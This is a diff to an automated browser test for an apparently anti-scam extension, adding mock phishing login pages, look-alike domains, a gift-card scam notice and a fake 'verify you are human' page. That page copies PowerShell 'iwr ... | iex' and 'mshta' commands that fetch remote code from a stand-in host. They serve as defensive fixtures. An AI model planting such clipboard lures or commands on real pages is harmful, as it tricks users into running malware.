@@ -30,10 +30,29 @@ const PAGE = `<!doctype html><html><head><title>t</title></head><body>
 ${AD_BOX}
 </body></html>`;
 
+const LOGIN = (title) => `<!doctype html><html><head><title>${title}</title></head><body>
+  <h1>${title}</h1><form><input name="u" id="u"><input type="password" id="pw"><button>Log in</button></form></body></html>`;
+const PAGES = {
+  "/frame": "<body style='margin:0;background:#fc0'>ad creative</body>",
+  "/login-paypal": LOGIN("PayPal: Log in"),
+  "/login-monzo": LOGIN("Monzo – Log in"),
+  "/login-generic": LOGIN("Members area"),
+  "/plain": "<!doctype html><title>Welcome</title><p>Hello there, welcome to our page.</p>",
+  "/clickfix": `<!doctype html><title>Verify</title><h2>Verify you are human</h2>
+    <p>1. Press Windows + R  2. Press Ctrl + V  3. Press Enter</p>
+    <button id="verify" onclick="navigator.clipboard.writeText('powershell -w hidden -c iwr http://x.test/a.ps1 | iex # I am not a robot - reCAPTCHA ID 2771')">I'm not a robot</button>
+    <textarea id="hidden" style="position:absolute;left:-9999px">mshta https://x.test/verify.hta # Cloudflare verification</textarea>
+    <button id="verify2" onclick="const t=document.getElementById('hidden');t.focus();t.select();document.execCommand('copy')">Verify</button>`,
+  "/docs": `<!doctype html><title>Install</title><p>Install Scoop from a PowerShell window:</p>
+    <button id="copy" onclick="navigator.clipboard.writeText('iwr -useb get.scoop.sh | iex')">Copy</button>`,
+  "/giftcard": `<!doctype html><title>Notice</title><main><h1>Final notice</h1>
+    <p>Your social security number has been suspended. To avoid arrest you must pay the fine today with Google Play gift cards.</p>
+    <p>Scratch the back of the card and read the code to the officer immediately.</p></main>`,
+};
 const server = http.createServer((req, res) => {
-  res.writeHead(200, { "content-type": "text/html" });
-  if (req.url.startsWith("/frame")) return res.end("<body style='margin:0;background:#fc0'>ad creative</body>");
-  res.end(PAGE.replace("PORT", String(server.address().port)));
+  res.writeHead(200, { "content-type": "text/html; charset=utf-8" });
+  const page = PAGES[req.url.split("?")[0]];
+  res.end(page || PAGE.replace("PORT", String(server.address().port)));
 }).listen(0);
 const port = server.address().port;
 const URL1 = `http://localhost:${port}/`;
@@ -48,7 +67,9 @@ await writeFile(path.join(EXT, "tests/fixtures/scriptlet-test.js"), runtime.repl
 
 const browser = await puppeteer.launch({
   executablePath: CHROME, headless: true, pipe: true, enableExtensions: true,
-  args: ["--no-first-run"], protocolTimeout: 30000,
+  // Fake domains for phishing tests resolve to the local test server.
+  args: ["--no-first-run", "--host-resolver-rules=MAP *.test 127.0.0.1, MAP www.paypal.com 127.0.0.1"],
+  protocolTimeout: 30000,
 });
 try {
   const extId = await browser.installExtension(EXT);
@@ -231,6 +252,124 @@ try {
   await sleep(800);
   const userTitle = await p3.$eval("#title", (e) => e.textContent).catch(() => "");
   check("user-blocked site shows 'You blocked this site'", /You blocked/.test(userTitle), userTitle);
+
+  /* --- scam & fraud guards --- */
+  const stat = async (kind) => (await worker.evaluate(async () => (await chrome.storage.local.get("stats")).stats || {}))[kind] || 0;
+  const hasWarning = (p) => p.evaluate(() => !!document.querySelector("blockify-warning"));
+  const visit = async (url, wait = 2500) => {
+    const p = await browser.newPage();
+    await p.goto(url, { waitUntil: "load" }).catch(() => {});
+    await sleep(wait);
+    return p;
+  };
+  const ctx = browser.defaultBrowserContext();
+
+  let before = await stat("phishing");
+  let g = await visit(`http://paypal-secure-login.test:${port}/login-paypal`);
+  check("phishing: fake PayPal login warned", (await hasWarning(g)) && (await stat("phishing")) > before);
+  await g.close();
+
+  before = await stat("phishing");
+  g = await visit(`http://paypa1.test:${port}/plain`);
+  check("phishing: digit look-alike (paypa1) warned", (await hasWarning(g)) && (await stat("phishing")) > before);
+  await g.close();
+
+  before = await stat("phishing");
+  g = await visit(`http://xn--pple-43d.test:${port}/plain`); // "аpple" with a Cyrillic а
+  check("phishing: homograph (Cyrillic аpple) warned", (await hasWarning(g)) && (await stat("phishing")) > before);
+  await g.close();
+
+  const wd = await worker.evaluate(() => blockify.officialSite("Monzo"));
+  check("wikidata: official website lookup works", wd.includes("monzo.com"), JSON.stringify(wd));
+  before = await stat("phishing");
+  g = await visit(`http://monzo-account.test:${port}/login-monzo`, 6000);
+  check("phishing: unknown brand checked via Wikidata (Monzo)", (await hasWarning(g)) && (await stat("phishing")) > before, "needs internet");
+  await g.close();
+
+  // Domain analysis, incl. real sites and near-miss words that must NOT warn.
+  // (Real brand domains like paypal.com are HSTS-preloaded, so they can't be faked over http here.)
+  const plainTab = await visit(`http://docs.test:${port}/plain`, 500);
+  const plainId = await worker.evaluate(async () => (await chrome.tabs.query({ url: "http://docs.test/*" }))[0].id);
+  const verdicts = await worker.evaluate(async (id) => {
+    const [{ result }] = await chrome.scripting.executeScript({ target: { tabId: id }, func: () => {
+      const v = (h, pw) => { const r = BlkGuard.analyzeHost(h, pw); return r ? `${r.brand.name}:${r.level}` : "ok"; };
+      const hex = (b) => [...b].map((x) => x.toString(16).padStart(2, "0")).join("");
+      return {
+        sha: hex(BlkGuard.sha256(new TextEncoder().encode("abc"))) === "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad" &&
+          hex(BlkGuard.sha256(new TextEncoder().encode("x".repeat(1000)))).length === 64,
+        real: ["www.paypal.com", "accounts.google.co.uk", "signin.ebay.de", "login.microsoftonline.com", "appleid.apple.com"].map((h) => v(h)),
+        fake: ["paypal.com.secure-login.top", "amazom-login.com", "micros0ft-support.com", "xn--pple-43d.com", "netflix-billing-update.xyz"].map((h) => v(h, true)),
+        safe: ["finance.com", "revolt.com", "apple-recipes.com", "pineapple.com", "chase-the-dream.com", "steamcleaning.com"].map((h) => v(h)),
+      };
+    } });
+    return result;
+  }, plainId);
+  await plainTab.close();
+  check("password: built-in SHA-256 correct (for http pages)", verdicts.sha === true);
+  check("phishing: real brand domains not flagged", verdicts.real.every((x) => x === "ok"), verdicts.real.join(","));
+  check("phishing: fake brand domains flagged", verdicts.fake.every((x) => x !== "ok"), verdicts.fake.join(","));
+  check("phishing: look-alike words don't cause false alarms", verdicts.safe.every((x) => x === "ok"), verdicts.safe.join(","));
+
+  // Password alert: seed the fingerprint exactly as the content script does on paypal.com.
+  await worker.evaluate(async () => {
+    let { pwSalt } = await chrome.storage.local.get("pwSalt");
+    if (!pwSalt) { pwSalt = "testsalt"; await chrome.storage.local.set({ pwSalt }); }
+    const buf = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(pwSalt + "\u0000" + "Sup3r-Secret-99"));
+    const f = [...new Uint8Array(buf)].slice(0, 12).map((b) => b.toString(16).padStart(2, "0")).join("");
+    await chrome.storage.local.set({ pwPrints: { PayPal: { f, n: 15, site: "paypal.com" } } });
+  });
+
+  before = await stat("password");
+  g = await visit(`http://members-area.test:${port}/login-generic`);
+  await g.type("#pw", "Sup3r-Secret-99");
+  await sleep(1200);
+  check("password: reuse on another site alerted", (await hasWarning(g)) && (await stat("password")) > before);
+  await g.close();
+
+  before = await stat("clickfix");
+  // Clipboard APIs need a secure context: localhost / 127.0.0.1 qualify.
+  const cfUrl = `http://localhost:${port}/clickfix`;
+  await ctx.overridePermissions(`http://localhost:${port}`, ["clipboard-read", "clipboard-write", "clipboard-sanitized-write"]);
+  g = await visit(cfUrl, 1000);
+  await g.click("#verify");
+  await sleep(800);
+  const clip1 = await g.evaluate(() => navigator.clipboard.readText());
+  check("clickfix: malicious writeText replaced", clip1.startsWith("STOP!"), clip1.slice(0, 40));
+  check("clickfix: warning shown", (await hasWarning(g)) && (await stat("clickfix")) > before);
+  await g.close(); // the warning now covers that page; use a fresh one for the second trick
+  g = await visit(cfUrl, 1000);
+  await g.evaluate(() => navigator.clipboard.writeText("reset"));
+  await g.click("#verify2");
+  await sleep(500);
+  const clip2 = await g.evaluate(() => navigator.clipboard.readText());
+  check("clickfix: execCommand('copy') path replaced", clip2.startsWith("STOP!"), clip2.slice(0, 40));
+  await g.close();
+
+  await ctx.overridePermissions(`http://127.0.0.1:${port}`, ["clipboard-read", "clipboard-write", "clipboard-sanitized-write"]);
+  g = await visit(`http://127.0.0.1:${port}/docs`, 1000);
+  await g.click("#copy");
+  await sleep(500);
+  check("clickfix: legit docs copy button untouched", (await g.evaluate(() => navigator.clipboard.readText())).includes("scoop"));
+  await g.close();
+
+  before = await stat("scam");
+  g = await visit(`http://notice.test:${port}/giftcard`);
+  check("scam: gift-card payment demand flagged", (await hasWarning(g)) && (await stat("scam")) > before);
+  await g.close();
+  g = await visit(`http://docs.test:${port}/plain`);
+  check("no warnings on a normal page", !(await hasWarning(g)));
+  await g.close();
+
+  // Settings switch: turning the fake-CAPTCHA guard off really turns it off.
+  await worker.evaluate(async () => { await chrome.storage.sync.set({ guards: { clickfix: false } }); });
+  await waitFor(async () => (await worker.evaluate(async () =>
+    (await chrome.scripting.getRegisteredContentScripts({ ids: ["blk-main"] }))[0]?.js.length === 2)));
+  g = await visit(cfUrl, 1000);
+  await g.click("#verify");
+  await sleep(500);
+  check("settings: clickfix guard can be switched off", (await g.evaluate(() => navigator.clipboard.readText())).includes("powershell"));
+  await g.close();
+  await worker.evaluate(async () => { await chrome.storage.sync.set({ guards: {} }); });
 
   /* --- allowlist turns everything off --- */
   await worker.evaluate(async () => { await chrome.storage.sync.set({ blocklist: [], allowlist: ["localhost"] }); });
